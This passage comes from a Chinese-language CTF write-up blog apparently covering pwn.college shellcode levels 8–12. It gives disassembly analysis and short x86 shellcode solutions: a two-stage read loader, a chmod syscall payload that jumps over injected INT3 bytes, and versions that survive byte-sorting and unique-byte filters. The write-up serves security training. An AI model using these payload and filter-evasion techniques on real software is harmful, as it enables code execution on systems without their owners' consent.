&lt;print_disassembly&gt;</span><br><span class="line"><span class="attribute">0x00005588814467a3</span> &lt;+<span class="number">572</span>&gt;:   lea    <span class="number">0</span>xceb(%rip),%rdi        # <span class="number">0</span>x558881447495</span><br><span class="line"><span class="attribute">0x00005588814467aa</span> &lt;+<span class="number">579</span>&gt;:   callq  <span class="number">0</span>x558881446120 &lt;puts@plt&gt;</span><br><span class="line"><span class="attribute">0x00005588814467af</span> &lt;+<span class="number">584</span>&gt;:   lea    <span class="number">0</span>xce0(%rip),%rdi        # <span class="number">0</span>x558881447496</span><br><span class="line"><span class="attribute">0x00005588814467b6</span> &lt;+<span class="number">591</span>&gt;:   callq  <span class="number">0</span>x558881446120 &lt;puts@plt&gt;</span><br><span class="line"><span class="attribute">0x00005588814467bb</span> &lt;+<span class="number">596</span>&gt;:   mov    <span class="number">0</span>x285e(%rip),%rax        # <span class="number">0</span>x558881449020 &lt;shellcode_mem&gt;</span><br><span class="line"><span class="attribute">0x00005588814467c2</span> &lt;+<span class="number">603</span>&gt;:   mov    %rax,%rdx</span><br><span class="line"><span class="attribute">0x00005588814467c5</span> &lt;+<span class="number">606</span>&gt;:   mov    $<span class="number">0</span>x0,%eax</span><br><span class="line"><span class="attribute">0x00005588814467ca</span> &lt;+<span class="number">611</span>&gt;:   callq  *%rdx</span><br><span class="line"><span class="attribute">0x00005588814467cc</span> &lt;+<span class="number">613</span>&gt;:   mov    $<span class="number">0</span>x0,%eax</span><br><span class="line"><span class="attribute">0x00005588814467d1</span> &lt;+<span class="number">618</span>&gt;:   leaveq </span><br><span class="line"><span class="attribute">0x00005588814467d2</span> &lt;+<span class="number">619</span>&gt;:   retq </span><br></pre></td></tr></table></figure>
<p>这里找到了程序执行<code>read</code>的操作, 这里就是将shellcode从stdin读入了, <code>edi</code>保存的是<code>read</code>的<code>fd(file descriptor)</code>参数, 0x0就是<code>/dev/stdin</code>. 然后<code>edx</code>保存的是<code>count</code>参数. 然后<code>rsi</code>保存的是读取的code保存的地址, 它的值为<code>rip + 0x28e6</code>.</p>
<p>继续往下看, 到<code>0x00005588814467ca &lt;+611&gt;</code>的位置, 发现call了<code>rdx</code>指向的内存, 从上面可以发现它的值是<code>rip + 0x285e</code>, 两个offset的差值是<code>0x28e6 - 0x285e = 0x88 (136)</code>, 而<code>0x0000558881446733 &lt;+460&gt;</code>到<code>0x00005588814467bb &lt;+596&gt;</code>的offset也是<code>136</code>, 那说明这里call的就是读入进来的shellcode, 可以看到在call之前已经执行了<code>mov $0x0,%eax</code>, 而这恰好就是<code>read</code>syscall的id, 那这就替一段的shell减少了一条语句, 然后就需要关注剩余的参数<code>rdi(fd)</code> <code>rsi(buf addr)</code> <code>rdx(size)</code>.</p>
<p><code>rdi</code>需要设置为0, 即<code>/dev/stdin</code>的file descriptor值.</p>
<p><code>rsi</code>需要设置为<code>rip</code>的地址, 如果使用<code>mov rsi, [rip]</code>或者<code>lea rsi, [rip]</code>的话, 编译出来的长度都不满足要求. 通过反编译出来的代码可以发现, <code>rdx</code>的值已经是第一段shellcode所在的地址了, 所以将<code>rsi</code>赋值为<code>rdx</code>的值再加上shellcode的长度即可, 但是会发现赋值之后再加编译出来的shellcode长度无法达到6byte的长度, <strong>那可以选择在第二段shellcode的开头填充6byte的<code>nop</code>.</strong><br><code>rdx</code>作为表示长度的参数, 它的值是一个内存地址, 保持它的值不变即可.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line">        <span class="keyword">push</span> <span class="built_in">rdx</span></span><br><span class="line">        <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><blockquote>
<p><em>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an instruction is an <code>INT 3</code>, which is an interrupt to call into the debugger. You must avoid these modifications in your shellcode.</em></p>
</blockquote>
<p>level 9会修改你的shellcode, 每隔10 byte将shellcode set成0xcc, 也就是<code>INT 3</code>, 要跳过中断的话用<code>jmp</code>即可, 中间可以填充<code>nop</code>或者其他byte. 然后尽量保证shellcode的长度在20 byte以内, 这样jmp之后在被set 0xcc之前就可执行结束.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line">        <span class="keyword">push</span> <span class="number">0x46</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">90</span></span><br><span class="line">        <span class="keyword">jmp</span> next</span><br><span class="line"><span class="meta">.fill</span> <span class="number">10</span>, <span class="number">1</span>, <span class="number">0x90</span></span><br><span class="line"><span class="symbol">next:</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">si</span>,<span class="number">4</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>

<h2 id="level-10-11"><a href="#level-10-11" class="headerlink" title="level 10, 11"></a>level 10, 11</h2><blockquote>
<p><em>This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort (e.g., the LSB being the right-most byte). This sort processed your shellcode 8 bytes at a time.</em></p>
</blockquote>
<p>level 10会将shellcode按照8byte为一组, 按组进行排序. 根据编译出来的hex code对asm语句顺序进行调整即可</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line">        <span class="keyword">push</span> <span class="number">0x46</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">90</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">si</span>,<span class="number">4</span></span><br><span class="line">        <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
<p>level 11在level 10的基础上关闭了<code>/dev/stdin</code>, 但是对于chmod来说没有影响, 用level 10的code同样可以pass.</p>
<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><blockquote>
<p><em>This challenge requires that every byte in your shellcode is unique!</em></p>
</blockquote>
<p>level 12的要求是shellcode中不能有重复的byte, level 10的code同样可以满足 :).</p>
</div><div class="tags"><a href="/tags/CTF"><i class="fa fa-tag">CTF</i></a><a href="/tags/shell injection"><i class="fa fa-tag">shell injection</i></a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="https://imaxct.github.io"/></form></div><div class="widget"><div class="author-info"><a class="info-avatar" href="/about/" title="About"><img class="nofancybox" src="/img/avatar.png"/></a><p>Hao.</p><a class="info-icon" href="https://github.com/imaxct" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a><a class="info-icon" href="/atom.xml" title="RSS" target="_blank" style="margin-inline:5px"> <i class="fa fa-rss-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/shell-injection/" style="font-size: 15px;">shell injection</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/02/25/PwnCollege-baby-shell-writeup/">PwnCollege baby shell writeup</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2023 <a href="/." rel="nofollow">Hao's blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0"></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js?v=1.0.0" successtext="Copy Successed!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css?v=1.0.0"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>